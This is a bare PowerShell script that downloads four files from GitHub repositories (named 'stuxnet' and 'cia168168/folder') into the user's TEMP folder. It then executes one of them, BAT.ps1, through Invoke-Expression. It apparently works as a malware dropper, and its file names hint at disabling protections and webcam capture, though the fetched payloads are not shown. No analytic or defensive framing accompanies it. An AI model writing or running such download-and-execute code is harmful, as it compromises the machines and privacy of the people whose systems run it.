$url1 = "https://raw.githubusercontent.com/Gaxi261/stuxnet/refs/heads/main/Chrome.ps1"
$output1 = "$env:TEMP\p.ps1"
Invoke-WebRequest -Uri $url1 -OutFile $output1
$url2 = "https://raw.githubusercontent.com/cia168168/folder/main/stop.ps1"
$output2 = "$env:TEMP\stop.ps1"
Invoke-WebRequest -Uri $url2 -OutFile $output2
$url9 = "https://raw.githubusercontent.com/Gaxi261/stuxnet/refs/heads/main/cam.cmd"
$output9 = "$env:TEMP\cam.cmd"
Invoke-WebRequest -Uri $url9 -OutFile $output9
$url3 = "https://raw.githubusercontent.com/cia168168/folder/main/BAT.ps1"
$output3 = "$env:TEMP\BAT.ps1"
Invoke-WebRequest -Uri $url3 -OutFile $output3
IEX ((New-Object Net.WebClient).DownloadString($output3))
